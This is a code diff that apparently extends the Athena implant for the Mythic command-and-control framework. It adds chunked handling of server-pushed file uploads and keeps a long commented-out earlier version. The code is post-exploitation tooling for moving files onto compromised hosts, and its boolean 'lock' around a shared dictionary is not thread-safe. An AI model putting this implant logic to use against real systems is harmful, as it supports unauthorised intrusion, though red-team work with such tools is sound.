@@ -9,6 +9,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
+using System.Threading.Tasks;
 
 namespace Athena
 {
@@ -64,6 +65,7 @@ namespace Athena
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
+                //Console.WriteLine("[TASKS] " + responseString);
                 GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                 if (gtr != null)
                 {
@@ -87,6 +89,58 @@ namespace Athena
             {
                 switch (job.task.command)
                 {
+                    case "upload":
+                        MythicUploadJob uj = Globals.uploadJobs[job.task.id];
+                        
+                        if (!uj.uploadStarted) {
+                            UploadResponse ur = new UploadResponse()
+                            {
+                                task_id = uj.task.id,
+                                upload = new UploadResponseData()
+                                {
+                                    chunk_size = 512000,
+                                    chunk_num = -1,
+                                    file_id = uj.file_id,
+                                    full_path = uj.path
+                                }
+                            };
+                            lrr.Add(ur);
+                        }
+                        else if (uj.complete)
+                        {
+                            UploadResponse ur = new UploadResponse()
+                            {
+                                task_id = uj.task.id,
+                                upload = new UploadResponseData()
+                                {
+                                    chunk_size = 512000,
+                                    chunk_num = uj.chunk_num,
+                                    file_id = uj.file_id,
+                                    full_path = uj.path
+                                },
+                                completed = "true"
+                                
+                            };
+                            lrr.Add(ur);
+                        }
+                        else
+                        {
+                            UploadResponse ur = new UploadResponse()
+                            {
+                                task_id = uj.task.id,
+                                upload = new UploadResponseData()
+                                {
+                                    chunk_size = 512000,
+                                    chunk_num = uj.chunk_num,
+                                    file_id = uj.file_id,
+                                    full_path = uj.path
+                                },
+                            };
+                            uj.uploadStarted = true;
+                            lrr.Add(ur);
+                        }
+
+                        break;
                     case "download":
                         MythicDownloadJob j = Globals.downloadJobs[job.task.id];
 
@@ -213,29 +267,163 @@ namespace Athena
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
-                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-                if (cs == null || cs.responses.Count < 1)
+                if (responseString.Contains("chunk_data"))
                 {
-                    return false;
-                }
-                else
-                {
-                    foreach(var response in cs.responses)
+                    PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
+                    if (cs == null || cs.responses.Count < 1)
                     {
-                        if (!String.IsNullOrEmpty(response.file_id))
+                        return false;
+                    }
+                    else
+                    {
+                        foreach(var response in cs.responses)
                         {
-                            MythicDownloadJob j = Globals.downloadJobs[response.task_id];
-                            if (string.IsNullOrEmpty(j.file_id))
+                            Task.Run(() =>
                             {
-                                j.file_id = response.file_id;
-                                j.hasoutput = false;
-                            }
+                                if (!String.IsNullOrEmpty(response.chunk_data))
+                                {
+                                    try
+                                    {
+                                        MythicUploadJob uj = Globals.uploadJobs[response.task_id];
+                                        MythicJob job = Globals.jobs[response.task_id];
+                                        uj.total_chunks = response.total_chunks;
+                                        uj.chunk_num = response.chunk_num;
+                                        if (!uj.chunkUploads.ContainsKey(response.chunk_num))
+                                        {
+                                            //Lock the Dictionary<int,string>()
+                                            uj.locked = true;
+                                            uj.chunkUploads.Add(response.chunk_num, response.chunk_data);
+                                            //Unlock the Dictionary so that it can be written
+                                            uj.locked = false;
+                                        }
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+                            });
                         }
                     }
                 }
+                else
+                {
+                    PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
+                    if (cs == null || cs.responses.Count < 1)
+                    {
+                        return false;
+                    }
+                    else
+                    {
+                        foreach (var response in cs.responses)
+                        {
+                            if (!String.IsNullOrEmpty(response.file_id))
+                            {
+                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                                if (string.IsNullOrEmpty(j.file_id))
+                                {
+                                    j.file_id = response.file_id;
+                                    j.hasoutput = false;
+                                }
+                            }
+                        }
+                    }
+                } 
+
+
+
+                //if (cs == null || cs.responses.Count < 1)
+                //{
+                //    return false;
+                //}
+                //else
+                //{
+                //    foreach (var response in cs.responses)
+                //    {
+                //        if (!String.IsNullOrEmpty(response.file_id))
+                //        {
+                //            MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                //            if (string.IsNullOrEmpty(j.file_id))
+                //            {
+                //                j.file_id = response.file_id;
+                //                j.hasoutput = false;
+                //            }
+                //        }
+                //    }
+                //}
+                //if (responseString.Contains("chunk_data")){
+                //    Console.WriteLine("Chunk_Data");
+                //    PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
+                //    if (cs == null || cs.responses.Count < 1)
+                //    {
+                //        return false;
+                //    }
+                //    else
+                //    {
+                //        foreach (var response in cs.responses)
+                //        {
+                //            if (Globals.uploadJobs.ContainsKey(response.task_id))
+                //            {
+                //                Console.WriteLine("Contained.");
+                //                try
+                //                {
+                //                    MythicUploadJob uj = Globals.uploadJobs[response.task_id];
+                //                    MythicJob job = Globals.jobs[response.task_id];
+                //                    Console.WriteLine($"Writing {Misc.Base64DecodeToByteArray(response.chunk_data).Length} bytes to {uj.path}");
+                //                    Misc.AppendAllBytes(response.full_path, Misc.Base64DecodeToByteArray(response.chunk_data));
+                //                    if (uj.chunk_num == uj.total_chunks)
+                //                    {
+                //                        Console.WriteLine("[DONE]");
+                //                        Console.WriteLine("Current Chunk: " + uj.chunk_num);
+                //                        Console.WriteLine(" Total Chunks: " + uj.total_chunks);
+                //                        uj.complete = true;
+                //                        job.complete = true;
+                //                        job.hasoutput = true;
+                //                    }
+                //                    else
+                //                    {
+                //                        Console.WriteLine("Current Chunk: " + uj.chunk_num);
+                //                        Console.WriteLine(" Total Chunks: " + uj.total_chunks);
+                //                        uj.chunk_num++;
+                //                        job.hasoutput = true;
+                //                    }
+                //                }
+                //                catch (Exception e)
+                //                {
+                //                    Console.WriteLine(e.Message);
+                //                }
+                //            }
+                //        }
+                //    }
+                //}
+                //else 
+                //{
+                //    PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
+
+                //    if (cs == null || cs.responses.Count < 1)
+                //    {
+                //        return false;
+                //    }
+                //    else
+                //    {
+                //        foreach (var response in cs.responses)
+                //        {
+                //            if (!String.IsNullOrEmpty(response.file_id))
+                //            {
+                //                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                //                if (string.IsNullOrEmpty(j.file_id))
+                //                {
+                //                    j.file_id = response.file_id;
+                //                    j.hasoutput = false;
+                //                }
+                //            }
+                //        }
+                //    }
+                //}
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e.Message);
                 return false;
             }
             return true;
